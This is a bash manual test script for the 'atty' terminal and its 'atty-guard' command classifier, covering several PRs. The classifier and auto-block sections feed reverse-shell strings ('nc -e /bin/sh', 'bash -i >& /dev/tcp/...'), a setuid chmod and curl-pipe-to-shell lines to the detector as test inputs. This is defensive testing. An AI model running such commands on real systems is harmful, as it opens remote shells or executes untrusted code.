#!/usr/bin/env bash
# Manual test runner for today's PR series (#119–#127).
#
# Each subcommand walks the user through one feature with concrete
# inputs to type, expected outputs to see, and a final yes/no
# confirmation. Pass `--all` to step through every section in
# order; pass a subcommand name to run just one.
#
# Run from the repo root:
#   ./scripts/test-prs.sh --help
#   ./scripts/test-prs.sh --all
#   ./scripts/test-prs.sh ghost
#   ./scripts/test-prs.sh atom-fetch

set -euo pipefail
# shellcheck source=/dev/null
source argsh

# Colours — TTY only; piping to less etc. falls back to plain text.
if [[ -t 1 ]]; then
  C_RESET=$'\e[0m'; C_DIM=$'\e[2m'; C_BOLD=$'\e[1m'
  C_GREEN=$'\e[32m'; C_YELLOW=$'\e[33m'; C_RED=$'\e[31m'; C_BLUE=$'\e[34m'
else
  C_RESET= C_DIM= C_BOLD= C_GREEN= C_YELLOW= C_RED= C_BLUE=
fi

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

section() { printf "\n%s━━━ %s ━━━%s\n" "${C_BOLD}${C_BLUE}" "$1" "${C_RESET}"; }
step()    { printf "%s» %s%s\n"          "${C_BOLD}"            "$1" "${C_RESET}"; }
note()    { printf "%s  %s%s\n"          "${C_DIM}"             "$1" "${C_RESET}"; }
expect()  { printf "%s  expect:%s %s\n"  "${C_GREEN}"           "${C_RESET}" "$1"; }
warn()    { printf "%s  ⚠ %s%s\n"        "${C_YELLOW}"          "$1" "${C_RESET}"; }
fail()    { printf "%s  ✗ %s%s\n"        "${C_RED}"             "$1" "${C_RESET}"; }
pass()    { printf "%s  ✓ %s%s\n"        "${C_GREEN}"           "$1" "${C_RESET}"; }

# Per-section yes/no confirmation. Records pass/fail into the
# trailing summary table.
declare -A RESULTS
confirm() {
  local label="$1"
  printf "\n%sDid it work as expected for %s? [y/N]%s " "${C_BOLD}" "${label}" "${C_RESET}"
  read -r ans
  case "${ans,,}" in
    y|yes) RESULTS["${label}"]="pass"; pass "${label}";;
    *)     RESULTS["${label}"]="fail"; fail "${label}";;
  esac
}

# Block until the user is ready to move on.
pause() { printf "\n%spress Enter to continue ...%s " "${C_DIM}" "${C_RESET}"; read -r; }

# Make sure the binary is built. Skip if `atty` is already on PATH
# (the user may be running a globally-installed copy).
ensure_build() {
  if command -v atty >/dev/null 2>&1; then
    note "using \`atty\` from PATH: $(command -v atty)"
    return 0
  fi
  if [[ ! -x "${ROOT}/zig-out/bin/atty" ]]; then
    step "building atty (zig build -Dtarget=x86_64-linux-gnu -Doptimize=ReleaseSafe)"
    (cd "${ROOT}" && zig build -Dtarget=x86_64-linux-gnu -Doptimize=ReleaseSafe)
  fi
  export PATH="${ROOT}/zig-out/bin:${PATH}"
  note "using ${ROOT}/zig-out/bin/atty"
}

ensure_atty_guard() {
  if command -v atty-guard >/dev/null 2>&1; then
    note "atty-guard on PATH: $(command -v atty-guard)"
    return 0
  fi
  if [[ ! -x "${ROOT}/atty-guard/target/release/atty-guard" ]]; then
    step "building atty-guard (cargo build --release --features atoms-fetch)"
    (cd "${ROOT}/atty-guard" && cargo build --release --features atoms-fetch)
  fi
  export PATH="${ROOT}/atty-guard/target/release:${PATH}"
  note "using ${ROOT}/atty-guard/target/release/atty-guard"
}

# ---------------------------------------------------------------------------
# Subcommand: ghost
# Covers PR #122 (Ctrl-A / cursor_pos / mid-line guards).

cmd_ghost() {
  section "PR #122 — Ghost overlay (cursor_pos tracking)"

  ensure_build
  step "open an atty session in another terminal:  atty bash"
  step "make sure your shell has OSC 133 wired:    eval \"\$(atty init bash)\""
  note "(skip if your .bashrc already does this)"
  pause

  step "1. type a known history command, press Enter"
  step "2. press Arrow-Up to recall it"
  step "3. press Ctrl-A (cursor jumps to BOL)"
  step "4. start typing a new char"
  expect "NO ghost text (cursor is mid-line)"
  expect "recalled line tail stays visible to the right of the cursor"
  confirm "Ctrl-A suppression"

  step "1. Arrow-Up again to recall"
  step "2. Ctrl-A then press End (or Ctrl-E)"
  step "3. type a char"
  expect "ghost text matches the FULL recalled line + the typed char"
  expect "no leading text missing — match should not be just the last char"
  confirm "Ctrl-A + End preserves recalled buffer"

  step "1. Arrow-Up to recall"
  step "2. Ctrl-A then Right-arrow N times until cursor reaches EOL"
  step "3. press Backspace"
  step "4. type a char"
  expect "ghost text re-engages after backspace at EOL"
  expect "match is full shortened line + char (not just the char)"
  confirm "Right-stepping to EOL + backspace re-engages ghost"
}

# ---------------------------------------------------------------------------
# Subcommand: windsurf
# Covers PR #124 (Space drop + Super+V `5~` leak).

cmd_windsurf() {
  section "PR #124 — Windsurf integrated-terminal compatibility"

  ensure_build
  warn "Windsurf-only — works as a sanity check in other terminals too"
  step "open Windsurf's integrated terminal"
  step "start an atty session:  atty bash"
  pause

  step "1. press Space at the prompt several times"
  expect "spaces appear on the prompt (not silently swallowed)"
  expect "typed line grows by one char each press"
  confirm "Space-key handling (PR #124, csiUToLegacy printable-ASCII)"

  step "1. select some text from the Windsurf editor pane"
  step "2. press Super+V (or whatever Windsurf binds to paste)"
  expect "selected text pastes into the atty prompt cleanly"
  expect "no trailing \`5~\` chars left over on the prompt"
  expect "no BEL beep from bash"
  confirm "Super+V paste (PR #124, isModifiedVtCsi drop)"

  step "1. press Tab on a partial command"
  step "2. press Enter on an empty prompt"
  expect "Tab + Enter still work — neither was regressed by the CSI-u changes"
  confirm "Tab + Enter still work"
}

# ---------------------------------------------------------------------------
# Subcommand: atom-fetch
# Covers PR #121 + #125 (V2-I baked-in fetcher + Sigma/LOLBAS sources).

cmd_atom_fetch() {
  section "PR #121 + #125 — V2-I baked-in atom fetcher (GTFOBins + Sigma + LOLBAS)"

  ensure_atty_guard
  note "this hits the live upstream — needs network"

  step "fetch all three sources (one-shot, no daemon):"
  step "  atty-guard --update-atoms-now"
  pause

  if atty-guard --update-atoms-now 2>&1 | tee /tmp/atty-prs-fetch.log; then
    pass "fetcher exited 0"
  else
    fail "fetcher exited non-zero"
  fi
  expect "stderr mentions \`atom refresh ok — N atoms across 3 sources\`"
  expect "N is at least ~1000 (Sigma + GTFOBins alone)"
  expect "per-source breakdown shows non-zero for gtfobins, sigma, lolbas"
  confirm "atom refresh"

  local out
  out="$(atty-guard --update-atoms-now 2>&1 | grep -oE '[0-9]+ atoms' | head -1 || true)"
  note "atom count from last run: ${out:-<unknown>}"

  step "the atom file:"
  step "  \${XDG_DATA_HOME:-\$HOME/.local/share}/atty-guard/flagged_atoms.txt"
  step "spot-check a known GTFOBins payload:"
  step "  grep -c 'nc -e' \"\${XDG_DATA_HOME:-\$HOME/.local/share}/atty-guard/flagged_atoms.txt\""
  expect "at least 1 atom matches \`nc -e\` (GTFOBins netcat reverse-shell)"
  pause

  step "smoke-test source subsetting:"
  step "  atty-guard --update-atoms-now --atoms-sources gtfobins,sigma"
  expect "report shows ONLY gtfobins + sigma in the per-source list"
  expect "no errors"
  confirm "source subsetting"
}

# ---------------------------------------------------------------------------
# Subcommand: classifier
# Covers PR #119 (AtomMatcher) + #126 (V2-J accumulator) + this PR (V2-J-2).

cmd_classifier() {
  section "PR #119 + #126 + #127 — Classifier (atoms + accumulator + auto-block)"

  ensure_atty_guard
  step "start atty-guard with the heuristic backend (no model file needed):"
  step "  atty-guard --tier2 heuristic"
  step "in another shell, drive it via the UDS protocol:"
  step "  ATTY_GUARD_SOCKET=\${XDG_RUNTIME_DIR:-/tmp}/atty-guard.sock"

  local helper
  helper="$(cat <<'BASH'
classify() {
  local sock="${ATTY_GUARD_SOCKET:-${XDG_RUNTIME_DIR:-/tmp}/atty-guard.sock}"
  local cmd="$1"
  local pid="$$"
  printf '{"op":"classify","pid":%s,"command":%s}\n' \
    "$pid" "$(jq -Rn --arg c "$cmd" '$c')" \
    | nc -U "$sock" -q 1 \
    | jq .
}
BASH
)"
  note "helper to source into your test shell (needs jq + ncat):"
  printf "%s\n" "${helper}"
  pause

  step "classify a single-atom command:"
  step "  classify 'nc -e /bin/sh 10.0.0.1 4444'"
  expect "verdict: Warn, confidence ~= 0.6, reason contains 'AtomMatcher'"
  confirm "single atom hit"

  step "classify a multi-atom command:"
  step "  classify 'bash -i >& /dev/tcp/10.0.0.1/4444 && nc -e /bin/sh'"
  expect "verdict: Warn, confidence > 0.6 (combined via 1 - prod(1-p))"
  expect "reason starts with \"N signals fired:\""
  confirm "multi-atom accumulator (#126)"

  step "classify a curl|sh (regex hit, single signal):"
  step "  classify 'curl -fsSL https://x.com/install.sh | sh'"
  expect "verdict: Warn, confidence = 1.0, category: CurlPipeSh"
  expect "reason does NOT start with 'N signals fired' (single-hit fast path)"
  confirm "single regex hit preserved (no auto-block)"
}

# ---------------------------------------------------------------------------
# Subcommand: auto-block (V2-J-2)

cmd_auto_block() {
  section "PR #127 — V2-J-2 auto-Block escalation (opt-in)"

  ensure_atty_guard
  step "create a TOML config that opts in:"
  cat <<'TOML'

  cat > /tmp/atty-guard-block.toml <<'EOF'
  [accumulator]
  block_threshold = 0.9
  EOF

TOML
  step "start the daemon with that config + heuristic backend:"
  step "  atty-guard --config /tmp/atty-guard-block.toml --tier2 heuristic"
  pause

  step "classify a multi-atom command (use the classify helper from --classifier):"
  step "  classify 'bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x'"
  expect "verdict: BLOCK (caller refuses outright instead of prompting)"
  expect "combined confidence >= 0.9"
  confirm "auto-block on multi-hit"

  step "classify a single-hit curl|sh — must STILL be Warn (min-2-hit guard):"
  step "  classify 'curl https://x.com/install.sh | sh'"
  expect "verdict: Warn (not Block)"
  expect "confidence == 1.0"
  confirm "single-hit guard preserves Warn"

  step "stop atty-guard, restart WITHOUT --config (default = no block_threshold)"
  step "re-classify the multi-atom command from above"
  expect "verdict: Warn (default off — no auto-block)"
  confirm "default-off backwards compat"
}

# ---------------------------------------------------------------------------
# Subcommand: summary

print_summary() {
  section "Summary"
  if (( ${#RESULTS[@]} == 0 )); then
    note "no sections completed yet"
    return 0
  fi
  local pass_count=0 fail_count=0
  for key in "${!RESULTS[@]}"; do
    if [[ "${RESULTS[$key]}" == "pass" ]]; then
      pass "${key}"
      ((pass_count++))
    else
      fail "${key}"
      ((fail_count++))
    fi
  done
  printf "\n%s%d passed, %d failed%s\n" "${C_BOLD}" "${pass_count}" "${fail_count}" "${C_RESET}"
  (( fail_count == 0 ))
}

# ---------------------------------------------------------------------------
# Argument parsing
#
# `:args` from argsh parses flags + positional and validates types.

main() {
  local -- which="all"
  local -i list=0

  local -a args=(
    'which'      "Subcommand: ghost | windsurf | atom-fetch | classifier | auto-block | all"
    'list|l:+'   "List subcommands and exit"
  )
  :args "Manual test runner for atty PRs #119-#127" "${@}"

  if (( list )); then
    cat <<'LIST'
Subcommands:
  ghost       — PR #122 (cursor_pos, Ctrl-A/End/Right-step ghost behaviour)
  windsurf    — PR #124 (Space drop + Super+V `5~` leak)
  atom-fetch  — PR #121 + #125 (V2-I + Sigma/LOLBAS)
  classifier  — PR #119 + #126 (AtomMatcher + accumulator)
  auto-block  — PR #127 (V2-J-2 opt-in auto-Block)
  all         — run every section in order
LIST
    exit 0
  fi

  case "${which}" in
    ghost)      cmd_ghost ;;
    windsurf)   cmd_windsurf ;;
    atom-fetch) cmd_atom_fetch ;;
    classifier) cmd_classifier ;;
    auto-block) cmd_auto_block ;;
    all)
      cmd_ghost
      cmd_windsurf
      cmd_atom_fetch
      cmd_classifier
      cmd_auto_block
      ;;
    *)
      printf "%sunknown subcommand:%s %s\n" "${C_RED}" "${C_RESET}" "${which}" >&2
      printf "run with -l to list subcommands\n" >&2
      exit 2
      ;;
  esac

  print_summary
}

main "${@}"
